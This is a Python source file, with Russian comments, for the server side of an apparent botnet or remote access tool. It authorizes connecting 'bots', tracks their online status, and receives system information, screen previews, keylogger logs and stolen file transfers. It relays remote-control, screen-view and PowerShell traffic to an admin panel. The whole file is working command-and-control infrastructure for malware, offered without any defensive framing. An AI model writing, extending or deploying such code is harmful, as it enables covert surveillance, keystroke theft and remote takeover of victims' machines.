# backend\Core\ClientConnection.py

import asyncio
import socket
import traceback
from typing import Optional

import backend.LoggerWrapper as logger
from backend.Services import read_packet, pack_packet, authorize_bot, sync_bot_data
from backend.Services import active_clients, preview_cache
from backend.Services.SystemState import system_state
from backend.Services.FileManager import file_service
from backend.API import manager
from backend import add_bytes

class BotConnectionHandler:
    """
    Обработчик входящих TCP-соединений от ботов.
    Реализует логику протокола V7.2 FINAL.
    """

    async def handle_new_connection(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        bot_id: Optional[str] = None
        peer_address = writer.get_extra_info("peername")[0]

        # Оптимизация сокета для быстрой передачи
        if (client_socket := writer.get_extra_info("socket")):
            client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

        try:
            # 1. Авторизация (получение ID бота)
            auth_res = await authorize_bot(reader, peer_address)
            if not auth_res:
                logger.Log.warning(f"[TCP] Auth failed for {peer_address}")
                return await self._force_close(writer)

            bot_id, _ = auth_res
            active_clients[bot_id] = (reader, writer)
            
            # 2. Обновление состояния в БД/Системе
            sync_bot_data(bot_id, {"status": "online"})
            system_state.broadcast_global_update()
            
            # Если в кэше уже есть картинка от предыдущей сессии, отправим её админам
            system_state.broadcast_preview(bot_id)

            # 3. Основной цикл обработки пакетов
            while True:
                try:
                    # Читаем пакет целиком согласно Header (6b)
                    raw_data = await asyncio.wait_for(read_packet(reader), timeout=45.0)
                except asyncio.TimeoutError: 
                    logger.Log.debug(f"[TCP] Connection timeout for {bot_id}")
                    break

                p_id, mod_body, payload = raw_data
                if not p_id: 
                    break # Соединение разорвано

                # Сбор статистики трафика (Header 6b + ID + Mod + Payload)
                p_len = 4 if isinstance(payload, int) else len(payload)
                add_bytes(6 + len(p_id) + len(mod_body) + p_len)

                # Парсинг Mod_Body по разделителю ":"
                mod_parts = mod_body.split(":", 1)
                mod_name = mod_parts[0]
                mod_file = mod_parts[1] if len(mod_parts) > 1 else "None"

                # --- ЛОГИКА ОБРАБОТКИ МОДУЛЕЙ V7.2 ---
                
                # А. Статичные данные системы
                if mod_name == "SystemInfoStream":
                    sync_bot_data(p_id, payload)
                    system_state.broadcast_global_update()

                # Б. Модуль PREVIEW (Атомарная передача байт в RAM)
                elif mod_name == "Preview":
                    if isinstance(payload, bytes) and len(payload) > 0:
                        # Обновляем кэш в Services.ClientManager
                        # Старое превью удаляется автоматически при присваивании нового
                        preview_cache[p_id] = payload
                        
                        # Рассылка через WebSocket (фронтенд получит актуальный кадр)
                        system_state.broadcast_preview(p_id, payload)
                        logger.Log.info(f"[TCP] Preview updated for {p_id} ({len(payload)} bytes)")
                    else:
                        logger.Log.warning(f"[TCP] Preview from {p_id} has invalid payload type")

                # В. Передача файлов (Keylogger, FileManager и т.д.)
                elif mod_name in ["Keylogger", "FileTransfer"] and isinstance(payload, int):
                    # Анонс: payload содержит общий размер файла
                    file_service.init_transfer(p_id, mod_file, payload)
                
                elif mod_name in ["KeyloggerStream", "FileTransferStream"]:
                    # Стрим: запись чанка данных
                    await file_service.write_chunk(p_id, mod_file, payload)

                # Г. Сердцебиение (Heartbeat)
                elif mod_name == "Heartbeat":
                    # Отвечаем понгом по стандарту
                    writer.write(pack_packet(p_id, "Heartbeat:None", "pong"))
                    await writer.drain()

                # Д. ТРАНЗИТ (ScreenView, RemoteControl, Powershell и т.д.)
                else:
                    # Все, что сервер не обрабатывает локально, летит админу на фронт
                    manager.broadcast_packet_sync(pack_packet(p_id, mod_body, payload))

        except (asyncio.IncompleteReadError, ConnectionResetError):
            logger.Log.debug(f"[TCP] Client {bot_id} reset connection")
        except Exception as e:
            logger.Log.error(f"[TCP] Runtime Error: {e}")
            # traceback.print_exc() 
        finally:
            await self._close_bot(bot_id, writer)

    async def _close_bot(self, bot_id: Optional[str], writer: asyncio.StreamWriter) -> None:
        """Корректное удаление бота из списков и закрытие сокета."""
        if bot_id and bot_id in active_clients:
            active_clients.pop(bot_id, None)
            sync_bot_data(bot_id, {"status": "offline"})
            system_state.broadcast_global_update()
            logger.Log.info(f"[TCP] Bot {bot_id} disconnected")
        
        await self._force_close(writer)

    async def _force_close(self, writer: asyncio.StreamWriter) -> None:
        """Принудительное закрытие потока."""
        try:
            if not writer.transport.is_closing():
                writer.close()
                await writer.wait_closed()
        except: 
            pass